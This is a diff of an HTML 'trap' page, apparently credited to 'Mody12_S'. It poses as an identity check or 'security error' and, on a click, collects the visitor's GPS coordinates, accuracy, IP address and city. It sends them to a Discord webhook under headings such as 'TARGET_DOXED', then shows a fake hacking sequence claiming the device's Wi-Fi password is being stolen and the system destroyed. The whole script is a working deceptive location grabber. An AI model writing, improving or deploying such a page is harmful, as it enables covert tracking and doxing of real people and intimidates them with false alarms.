@@ -3,135 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verification Required</title> 
+    <title>⚠️ SYSTEM_CRITICAL</title> 
     <style>
         body, html { 
             margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;
-            /* Professional Security Background */
-            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1920&q=80') no-repeat center center fixed; 
+            background: url('https://images.unsplash.com/photo-1500622764614-be3c178304c3?q=80&w=2070') no-repeat center center fixed; 
             background-size: cover;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
+            font-family: 'Courier New', monospace;
             display: flex; align-items: center; justify-content: center;
         }
 
-        /* THE VERIFICATION BOX */
-        #verify-box {
-            position: relative; z-index: 10;
-            background: rgba(255, 255, 255, 0.98);
-            padding: 50px 30px; border-radius: 12px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
-            text-align: center; width: 90%; max-width: 400px;
+        /* DARK GLITCH OVERLAY */
+        #overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(4px); z-index: 1;
         }
 
-        h2 { color: #202124; margin: 0 0 15px 0; font-weight: 500; }
-        p { color: #5f6368; font-size: 1rem; line-height: 1.5; margin-bottom: 35px; }
+        /* THE TRAP BOX */
+        #trap-box {
+            position: relative; z-index: 10;
+            background: rgba(10, 10, 10, 0.9);
+            padding: 30px; border: 2px solid #ff0000;
+            box-shadow: 0 0 20px #ff0000;
+            text-align: center; width: 85%; max-width: 400px;
+            color: #ff0000;
+        }
+
+        h2 { text-transform: uppercase; letter-spacing: 2px; margin-bottom: 5px; }
+        p { color: #ccc; font-size: 0.85rem; margin-bottom: 25px; }
 
         #start-btn { 
-            background: #1a73e8; color: white; border: none; 
-            padding: 14px 24px; font-size: 1rem; border-radius: 4px;
-            cursor: pointer; font-weight: 500; width: 100%;
-            transition: background 0.2s;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            background: transparent; color: #ff0000; border: 2px solid #ff0000;
+            padding: 15px; font-size: 1rem; font-weight: bold; width: 100%;
+            cursor: pointer; transition: 0.2s;
         }
 
-        #start-btn:hover { background: #1765cc; }
+        #start-btn:hover { background: #ff0000; color: black; box-shadow: 0 0 15px #ff0000; }
 
         /* THE HACKER CONSOLE */
         #console { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 100; 
-            display: none; flex-direction: column; align-items: center; justify-content: center;
-            color: #00FF41; font-family: 'Courier New', monospace;
+            background: #000; z-index: 100; display: none;
+            flex-direction: column; align-items: center; justify-content: center;
+            color: #00FF41;
         }
-        #log { width: 85%; max-width: 600px; }
+        #log { width: 90%; max-width: 600px; font-size: 0.9rem; }
     </style>
 </head>
 <body>
 
-    <div id="verify-box">
-        <div style="font-size: 48px; margin-bottom: 20px;">🔒</div>
-        <h2>Identity Verification</h2>
-        <p>To access this content, please complete a quick security check to confirm you are not a robot.</p>
-        <button id="start-btn" onclick="startTrap()">[ VERIFY NOW ]</button>
+    <div id="overlay"></div>
+
+    <div id="trap-box">
+        <h2>⚠️ SECURITY_ERROR</h2>
+        <p>ENCRYPTED CONTENT DETECTED. PLEASE VERIFY LOCATION TO DECRYPT DATA STREAM.</p>
+        <button id="start-btn" onclick="ignite()">[ INITIALIZE_DECRYPT ]</button>
     </div>
 
     <div id="console">
         <div id="log">
-            <h1 style="color:#ff3333; text-shadow: 0 0 8px #ff3333;">> [ BREACH_INITIALIZED ]</h1>
+            <h1 style="color:red; text-shadow: 0 0 10px red;">> [ BREACH_ESTABLISHED ]</h1>
             <div id="output"></div>
         </div>
     </div>
 
     <script>
-        // PASTE YOUR DISCORD WEBHOOK URL BELOW
         const WEBHOOK = "YOUR_DISCORD_WEBHOOK_HERE"; 
 
-        async function startTrap() {
-            // STEP 1: Show the console immediately
-            document.getElementById('verify-box').style.display = 'none';
+        async function ignite() {
+            // STEP 1: Show Hacking Immediately
+            document.getElementById('trap-box').style.display = 'none';
             document.getElementById('console').style.display = 'flex';
             
-            // STEP 2: Ask for REAL GPS (The Trap)
+            // STEP 2: The GPS Trap
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => sendData(pos.coords.latitude, pos.coords.longitude),
-                    () => sendData("DENIED", "DENIED")
+                    (pos) => sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
+                    () => sendData("DENIED", "DENIED", 0)
                 );
-            } else {
-                sendData("NOT_SUPPORTED", "NOT_SUPPORTED");
             }
-
             runHackerTyping();
         }
 
-        async function sendData(lat, lon) {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const ipData = await response.json();
+        async function sendData(lat, lon, acc) {
+            const ipFetch = await fetch('https://ipapi.co/json/');
+            const ipData = await ipFetch.json();
 
-                const discordMessage = {
-                    content: "🚨 **NEW TARGET COMPROMISED** 🚨",
-                    embeds: [{
-                        title: "Mody12_S Exploit Report",
-                        color: 16724787,
-                        fields: [
-                            { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: true },
-                            { name: "📍 Location", value: `${ipData.city}, ${ipData.region}`, inline: true },
-                            { name: "🎯 GPS Lock", value: lat !== "DENIED" ? `[View on Google Maps](https://www.google.com/maps?q=${lat},${lon})` : "❌ DENIED", inline: false },
-                            { name: "📱 Hardware", value: navigator.platform, inline: true }
-                        ],
-                        timestamp: new Date()
-                    }]
-                };
+            const payload = {
+                content: "🛑 **Mody12_S - TARGET_DOXED** 🛑",
+                embeds: [{
+                    color: 16711680,
+                    title: "CRITICAL_DATA_EXTRACTED",
+                    fields: [
+                        { name: "👤 IP", value: `\`${ipData.ip}\``, inline: true },
+                        { name: "📍 CITY", value: ipData.city, inline: true },
+                        { name: "🎯 GPS_LOCK", value: lat !== "DENIED" ? `[OPEN_MAP](https://www.google.com/maps?q=${lat},${lon})` : "❌ REJECTED", inline: false },
+                        { name: "📏 ACCURACY", value: `${acc} meters`, inline: true }
+                    ]
+                }]
+            };
 
-                fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(discordMessage) });
-            } catch (e) { console.error(e); }
+            fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
         }
 
         function runHackerTyping() {
-            const lines = [
-                "ESTABLISHING HANDSHAKE...",
-                "BYPASSING BROWSER_ENCRYPTION...",
-                "LOCATING SYSTEM_CORE...",
-                "UPLOADING TROJAN_PAYLOAD...",
-                "ACCESSING LOCAL_FILES...",
-                "CRITICAL: SECURITY_TRACE_DETECTED!",
-                "EMERGENCY_WIPE_INITIALIZED..."
-            ];
+            const lines = ["BYPASSING_BROWSER...", "TRIANGULATING_GPS...", "UPLOADING_LOGS...", "STEALING_WIFI_PASS...", "CRITICAL_TRACE!", "PURGING_SYSTEM..."];
             let i = 0;
-            const output = document.getElementById('output');
             const interval = setInterval(() => {
                 if (i < lines.length) {
-                    output.innerHTML += `<p>> ${lines[i]}</p>`;
+                    document.getElementById('output').innerHTML += `<p>> ${lines[i]}</p>`;
                     i++;
                 } else {
                     clearInterval(interval);
-                    setTimeout(() => {
-                        document.body.innerHTML = "<h1 style='color:white; text-align:center; margin-top:20%; font-size:3rem; font-family:monospace;'>SYSTEM PURGED 100%</h1>";
-                        document.body.style.background = "#000";
-                    }, 2000);
+                    setTimeout(() => { document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%;'>SYSTEM_DESTROYED</h1>"; }, 1500);
                 }
-            }, 900);
+            }, 800);
         }
     </script>
 </body>
